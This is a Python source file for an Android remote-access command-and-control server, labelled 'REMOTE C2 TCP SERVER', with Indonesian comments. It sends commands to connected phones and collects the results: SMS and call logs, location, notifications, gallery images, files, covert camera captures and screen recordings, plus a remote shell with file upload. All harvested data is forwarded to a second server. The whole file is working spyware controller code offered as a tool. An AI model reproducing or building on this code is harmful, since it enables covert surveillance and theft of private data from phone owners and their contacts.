#!/usr/bin/env python3
import socket
import json
import threading
import base64
from datetime import datetime
import time
import logging
import sys
import os
import signal
from colorama import init, Fore, Style
import requests  # Untuk kirim data ke server2

# --- Konfigurasi ---
TCP_PORT = int(os.environ.get('TCP_PORT', 9090))
SERVER2_URL = os.environ.get('SERVER2_URL', 'http://localhost:9191')  # URL server2
HOST = '0.0.0.0'

# --- Globals ---
client_socket = None
client_address = None
running = True
in_shell_mode = False
in_notification_mode = False
in_gallery_mode = False
device_current_dir = "/"
connected_devices = {}  # Menyimpan multiple devices jika perlu

# --- Setup ---
init(autoreset=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('server1.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Buat direktori jika belum ada
for dir_name in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads']:
    if not os.path.exists(dir_name):
        os.makedirs(dir_name)

# --- Fungsi untuk kirim data ke server2 ---
def forward_to_server2(data_type, payload):
    """Mengirim data ke Flask server (server2.py)"""
    try:
        response = requests.post(
            f"{SERVER2_URL}/api/data",
            json={
                'type': data_type,
                'payload': payload,
                'client_info': {
                    'address': client_address[0] if client_address else 'unknown',
                    'timestamp': datetime.now().isoformat()
                }
            },
            timeout=1
        )
        if response.status_code != 200:
            logger.error(f"Failed to forward to server2: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Error forwarding to server2: {e}")
    except Exception as e:
        logger.error(f"Unexpected error forwarding to server2: {e}")

# --- UI & Data Handlers (modifikasi untuk forward) ---
def clear_screen(): 
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    print(Fore.CYAN + "=" * 80)
    print(Fore.CYAN + "             REMOTE C2 TCP SERVER (SERVER1)")
    print(Fore.CYAN + f"             Listening on port {TCP_PORT}")
    print(Fore.CYAN + "=" * 80)

def print_device_info(info):
    print(f"""{Fore.CYAN}
--- Device Information ---{Style.RESET_ALL}
  {Fore.YELLOW}Model:         {Fore.WHITE}{info.get('Model', 'N/A')}
  {Fore.YELLOW}Manufacturer:  {Fore.WHITE}{info.get('Manufacturer', 'N/A')}
  {Fore.YELLOW}Android Ver:   {Fore.WHITE}{info.get('AndroidVersion', 'N/A')} (SDK {info.get('SDKVersion', 'N/A')})
  {Fore.YELLOW}Battery:       {Fore.WHITE}{info.get('Battery', 'N/A')}
{Fore.CYAN}--------------------------{Style.RESET_ALL}""")
    # Forward ke server2
    forward_to_server2('DEVICE_INFO', info)

def print_notification_log(log):
    sys.stdout.write(f"\r{' ' * 50}\r")
    sys.stdout.write(f"{Fore.MAGENTA}\n[NOTIF | {log.get('packageName', 'N/A')}]\n  {Fore.YELLOW}Title: {Fore.WHITE}{log.get('title', 'N/A')}\n  {Fore.YELLOW}Text:  {Fore.WHITE}{log.get('text', 'N/A')}\n")
    sys.stdout.flush()
    # Forward ke server2
    forward_to_server2('NOTIFICATION', log)

def print_sms_log(log): 
    print(f"\n{Fore.GREEN}[SMS - {log.get('userSender', 'N/A')}]: {Fore.WHITE}{log.get('content', 'N/A')}")
    forward_to_server2('SMS', log)

def print_call_log(log):
    type_color = {"INCOMING": Fore.GREEN, "OUTGOING": Fore.YELLOW, "MISSED": Fore.RED}.get(log.get('call_type', 'UNKNOWN'), Fore.WHITE)
    print(f"\n{Fore.CYAN}[CALL] Num: {Fore.WHITE}{log.get('number', 'N/A')}|{type_color}{log.get('call_type', 'N/A')}{Style.RESET_ALL}|Dur: {log.get('duration_seconds', 'N/A')}s|Date: {log.get('date', 'N/A')}")
    forward_to_server2('CALL', log)

def save_image(log_data, folder='captured_images'):
    try:
        filename = log_data.get('filename', f"image_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        filepath = os.path.join(folder, filename)
        
        # Decode dan simpan
        image_data = base64.b64decode(log_data.get('image_base64', ''))
        with open(filepath, 'wb') as f:
            f.write(image_data)
        
        print(f"\n{Fore.MAGENTA}[IMAGE] Saved to: {filepath}")
        
        # Forward ke server2 (dengan base64 yang sudah ada)
        forward_to_server2('IMAGE', {
            'filename': filename,
            'image_base64': log_data.get('image_base64', ''),
            'filepath': filepath,
            'type': log_data.get('type', 'camera')
        })
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] Could not save image: {e}")

def print_app_list(log_data):
    apps = log_data.get('apps', [])
    print(Fore.CYAN + "\n--- Installed Applications ---")
    for i, app in enumerate(apps): 
        print(f"{i+1}. {app.get('appName', 'N/A')} ({app.get('packageName', 'N/A')})")
    print(Fore.CYAN + "-----------------------------")
    forward_to_server2('APP_LIST', {'apps': apps, 'count': len(apps)})

def print_gallery_page(log_data):
    files = log_data.get('files', [])
    print(Fore.CYAN + "\n--- Gallery Page ---")
    if not files: 
        print("No more images.")
    else:
        for f in files: 
            print(f"[{f.get('index')}] {f.get('name')} {Fore.YELLOW}({f.get('path', '...')}) ")
    print(Fore.CYAN + "---------------------")
    forward_to_server2('GALLERY_PAGE', log_data)

def handle_file_chunk(log_data, folder):
    try:
        filename = log_data.get('filename', 'downloaded_file')
        filepath = os.path.join(folder, filename)
        
        # Decode chunk
        chunk_data = base64.b64decode(log_data.get('chunk', ''))
        
        # Append ke file
        with open(filepath, 'ab') as f:
            f.write(chunk_data)
        
        # Hitung progress
        file_size = os.path.getsize(filepath)
        sys.stdout.write(f"\r{Fore.BLUE}[DOWNLOAD] Receiving {filename}... {file_size/1024:.1f} KB")
        sys.stdout.flush()
        
        # Forward progress ke server2 (optional, bisa di-skip untuk mengurangi traffic)
        if file_size % (1024*1024) < 8192:  # Update setiap ~1MB
            forward_to_server2('FILE_PROGRESS', {
                'filename': filename,
                'size': file_size,
                'folder': folder
            })
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] Could not write file chunk: {e}")

def handle_incoming_data(data):
    global in_shell_mode, in_notification_mode, in_gallery_mode, device_current_dir
    
    try:
        payload = json.loads(data).get('data', {})
        log_type = payload.get('type', 'UNKNOWN')
        
        # Log ke console
        logger.info(f"Received data type: {log_type} from {client_address[0] if client_address else 'unknown'}")

        # Handler mapping dengan forward ke server2
        handler_map = {
            'SMS_LOG': lambda p: print_sms_log(p.get('log')),
            'CALL_LOG': lambda p: print_call_log(p.get('log')),
            'IMAGE_DATA': lambda p: save_image(p.get('image')),
            'APP_LIST': print_app_list,
            'DEVICE_INFO': lambda p: print_device_info(p.get('info')),
            'GET_FILE_CHUNK': lambda p: handle_file_chunk(p.get('chunk_data'), 'device_downloads'),
            'GALLERY_IMAGE_CHUNK': lambda p: handle_file_chunk(p.get('chunk_data'), 'gallery_downloads'),
            'NOTIFICATION_DATA': lambda p: print_notification_log(p.get('notification')),
            'LOCATION_SUCCESS': lambda p: handle_location(p),
            'LOCATION_FAIL': lambda p: handle_location_fail(p),
            'SCREEN_RECORDER_STARTED': lambda p: handle_recorder_started(p),
            'SCREEN_RECORDER_STOPPED': lambda p: handle_recorder_stopped(p),
            'GET_FILE_END': lambda p: handle_file_end(p),
            'GALLERY_IMAGE_END': lambda p: handle_gallery_end(p),
            'FILE_MANAGER_RESULT': lambda p: handle_file_manager(p),
            'SHELL_LS_RESULT': lambda p: handle_shell_ls(p),
            'SHELL_MODE_STARTED': lambda p: handle_shell_start(p),
            'SHELL_MODE_ENDED': lambda p: handle_shell_end(p),
            'NOTIFICATION_MODE_STARTED': lambda p: handle_notif_start(p),
            'NOTIFICATION_MODE_ENDED': lambda p: handle_notif_end(p),
            'GALLERY_MODE_STARTED': lambda p: handle_gallery_start(p),
            'GALLERY_MODE_ENDED': lambda p: handle_gallery_end_mode(p),
            'GALLERY_SCAN_STARTED': lambda p: handle_gallery_scan(p),
            'GALLERY_SCAN_COMPLETE': lambda p: handle_gallery_complete(p),
            'GALLERY_PAGE_DATA': print_gallery_page,
            'SHELL_CD_SUCCESS': lambda p: handle_cd_success(p),
        }
        
        if log_type in handler_map:
            handler_map[log_type](payload)
        else:
            print(f"\n{Fore.YELLOW}[LOG]: {payload}")
            forward_to_server2('UNKNOWN', payload)

    except json.JSONDecodeError:
        error_msg = f"Received non-JSON data: {data[:200]}..."
        print(f"\n{Fore.RED}[ERROR] {error_msg}")
        forward_to_server2('ERROR', {'message': error_msg, 'raw': data[:500]})
    except Exception as e:
        error_msg = f"Could not process data: {e}"
        print(f"\n{Fore.RED}[ERROR] {error_msg}")
        forward_to_server2('ERROR', {'message': error_msg})

# Handler tambahan untuk forwarding
def handle_location(payload):
    url = payload.get('url')
    print(f"\n{Fore.YELLOW}[LOCATION] {url}")
    forward_to_server2('LOCATION', {'url': url, 'success': True})

def handle_location_fail(payload):
    error = payload.get('error')
    print(f"\n{Fore.RED}[LOCATION] Failed: {error}")
    forward_to_server2('LOCATION', {'error': error, 'success': False})

def handle_recorder_started(payload):
    print(f"\n{Fore.BLUE}[REC] Screen recording started...")
    forward_to_server2('RECORDER', {'status': 'started'})

def handle_recorder_stopped(payload):
    print(f"\n{Fore.BLUE}[REC] Recording stopped. Receiving file...")
    forward_to_server2('RECORDER', {'status': 'stopped'})

def handle_file_end(payload):
    print(f"\n{Fore.GREEN}[DOWNLOAD] File {payload.get('file')} saved.")
    forward_to_server2('FILE_COMPLETE', {'file': payload.get('file'), 'type': 'download'})

def handle_gallery_end(payload):
    print(f"\n{Fore.GREEN}[GALLERY] Image {payload.get('file')} saved.")
    forward_to_server2('FILE_COMPLETE', {'file': payload.get('file'), 'type': 'gallery'})

def handle_file_manager(payload):
    files = payload.get('files', [])
    for f in files:
        print(f"[D] {f['name']}/" if f['isDirectory'] else f['name'])
    forward_to_server2('FILE_MANAGER', {'files': files, 'count': len(files)})

def handle_shell_ls(payload):
    files = payload.get('files', [])
    for f in files:
        print(f"{Fore.CYAN if f['isDirectory'] else Fore.WHITE}{f['name']}")
    forward_to_server2('SHELL_LS', {'files': files})

def handle_shell_start(payload):
    global in_shell_mode, device_current_dir
    in_shell_mode = True
    device_current_dir = payload.get("current_dir", "/")
    forward_to_server2('SHELL_MODE', {'status': 'started', 'dir': device_current_dir})

def handle_shell_end(payload):
    global in_shell_mode
    in_shell_mode = False
    forward_to_server2('SHELL_MODE', {'status': 'ended'})

def handle_notif_start(payload):
    global in_notification_mode
    in_notification_mode = True
    forward_to_server2('NOTIF_MODE', {'status': 'started'})

def handle_notif_end(payload):
    global in_notification_mode
    in_notification_mode = False
    forward_to_server2('NOTIF_MODE', {'status': 'ended'})

def handle_gallery_start(payload):
    global in_gallery_mode
    in_gallery_mode = True
    forward_to_server2('GALLERY_MODE', {'status': 'started'})

def handle_gallery_end_mode(payload):
    global in_gallery_mode
    in_gallery_mode = False
    forward_to_server2('GALLERY_MODE', {'status': 'ended'})

def handle_gallery_scan(payload):
    print(f"\n{Fore.BLUE}[GALLERY] Scanning device...")
    forward_to_server2('GALLERY_SCAN', {'status': 'started'})

def handle_gallery_complete(payload):
    print(f"\n{Fore.GREEN}[GALLERY] Scan complete. {payload.get('image_count')} images found.")
    forward_to_server2('GALLERY_SCAN', {
        'status': 'complete',
        'count': payload.get('image_count')
    })

def handle_cd_success(payload):
    global device_current_dir
    device_current_dir = payload.get("current_dir", "/")
    forward_to_server2('SHELL_CD', {'dir': device_current_dir})

# --- Core TCP Server ---
def client_listener(sock):
    """Thread untuk handle koneksi client"""
    buffer = ""
    while running and sock:
        try:
            data = sock.recv(16384).decode('utf-8', errors='ignore')
            if not data:
                break
            buffer += data
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip():
                    handle_incoming_data(line.strip())
        except ConnectionResetError:
            break
        except socket.timeout:
            continue
        except Exception as e:
            logger.error(f"Listener error: {e}")
            break
    
    # Client disconnected
    print(f"\n{Fore.RED}Client disconnected.")
    global client_socket
    client_socket = None
    forward_to_server2('CONNECTION', {'status': 'disconnected'})

def send_command(cmd):
    """Mengirim command ke client"""
    global client_socket
    if client_socket:
        try:
            client_socket.sendall(f"{cmd}\n".encode())
            return True
        except:
            return False
    return False

def input_prompt():
    if in_shell_mode:
        return f"{Fore.YELLOW}Shell@{device_current_dir}> {Style.RESET_ALL}"
    elif in_notification_mode:
        return f"{Fore.MAGENTA}Notifikasi > {Style.RESET_ALL}"
    elif in_gallery_mode:
        return f"{Fore.CYAN}Gallery > {Style.RESET_ALL}"
    elif client_address:
        return f"{Fore.GREEN}C2 @ {client_address[0]} > {Style.RESET_ALL}"
    else:
        return ""

def shell():
    """Main input loop untuk command"""
    global running
    
    while running:
        if not client_socket:
            time.sleep(1)
            continue
            
        try:
            prompt = input_prompt()
            cmd_input = input(prompt)
            
            if not cmd_input:
                continue
                
            # Forward command ke server2 untuk logging
            forward_to_server2('COMMAND', {
                'command': cmd_input,
                'mode': 'shell' if in_shell_mode else 'notification' if in_notification_mode else 'gallery' if in_gallery_mode else 'main'
            })
            
            # Handle special modes
            if in_notification_mode:
                if cmd_input.strip().lower() == 'exit':
                    print(f"{Fore.YELLOW}Sending command: exit...", flush=True)
                    send_command("exit")
                continue
                
            cmd_parts = cmd_input.strip().split(" ", 1)
            cmd = cmd_parts[0].lower()
            
            if cmd == 'quit':
                running = False
                break
            
            # Send command to client
            if in_shell_mode:
                if cmd == 'exit':
                    cmd_input = 'exit_shell'
                print(f"{Fore.YELLOW}Sending shell command: {cmd_input}...", flush=True)
                
                if cmd == 'upload':
                    if len(cmd_parts) < 2:
                        print("Usage: upload <local_file_path>")
                        continue
                    local_path = cmd_parts[1]
                    if not os.path.exists(local_path):
                        print(f"File not found: {local_path}")
                        continue
                    
                    with open(local_path, 'rb') as f:
                        file_data = f.read()
                    
                    filename_b64 = base64.b64encode(os.path.basename(local_path).encode()).decode()
                    data_b64 = base64.b64encode(file_data).decode()
                    send_command(f"upload {filename_b64} {data_b64}")
                else:
                    send_command(cmd_input)
                    
            elif in_gallery_mode:
                gallery_commands = ['next', 'back', 'exit']
                if cmd in gallery_commands:
                    print(f"{Fore.YELLOW}Sending command: {cmd}...", flush=True)
                    send_command(cmd)
                elif cmd == 'view' and len(cmd_parts) > 1:
                    print(f"{Fore.YELLOW}Sending command: {cmd_input}...", flush=True)
                    send_command(cmd_input)
                else:
                    print("Gallery commands: next, back, view <index>, exit")
                    
            else:  # Main menu commands
                main_commands = ['shell', 'getsms', 'getcalllogs', 'flashon', 'flashoff', 
                                'takefrontpic', 'takebackpic', 'list_app', 'get_location', 
                                'screen_recorder', 'filemanager', 'notifikasi', 'gallery', 'deviceinfo']
                
                if cmd in main_commands and len(cmd_parts) == 1:
                    print(f"{Fore.YELLOW}Sending command: {cmd}...", flush=True)
                    send_command(cmd)
                elif cmd_input.startswith(('run ', 'open ', 'toast ')):
                    print(f"{Fore.YELLOW}Sending command: {cmd_input}...", flush=True)
                    send_command(cmd_input)
                elif cmd == 'help':
                    print("Commands: shell, filemanager, gallery, notifikasi, deviceinfo, open <url>, toast on/off <text>, getsms, getcalllogs, get_location, screen_recorder, list_app, run <pkg>, flashon/off, takefront/backpic, help, quit")
                else:
                    print("Unknown command. Type 'help' for a list.")
                    
        except (EOFError, KeyboardInterrupt):
            running = False
            break
        except Exception as e:
            print(f"\n{Fore.RED}[ERROR] Shell crashed: {e}")

def main():
    """Main function"""
    global client_socket, client_address, running
    
    def signal_handler(sig, frame):
        global running
        running = False
        print("\nShutting down server...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    clear_screen()
    print_header()
    
    # Setup TCP server
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((HOST, TCP_PORT))
        server_socket.listen(5)
        print(f"[*] TCP Server listening on {HOST}:{TCP_PORT}")
        print(f"[*] Forwarding data to server2 at {SERVER2_URL}")
        
        # Start shell thread
        threading.Thread(target=shell, daemon=True).start()
        
        # Main accept loop
        while running:
            if not client_socket:
                print("[*] Waiting for device connection...")
                try:
                    server_socket.settimeout(1.0)
                    conn, addr = server_socket.accept()
                    conn.settimeout(5.0)
                    client_socket, client_address = conn, addr
                    
                    print(f"\n{Fore.GREEN}[+] Device connected from {addr[0]}:{addr[1]}")
                    forward_to_server2('CONNECTION', {
                        'status': 'connected',
                        'address': addr[0],
                        'port': addr[1]
                    })
                    
                    # Start listener thread untuk device ini
                    threading.Thread(target=client_listener, args=(conn,), daemon=True).start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    logger.error(f"Accept error: {e}")
                    time.sleep(1)
            
            time.sleep(0.1)
            
    except Exception as e:
        logger.error(f"Server error: {e}")
    finally:
        server_socket.close()
        print("Server shut down.")

if __name__ == '__main__':
    main()
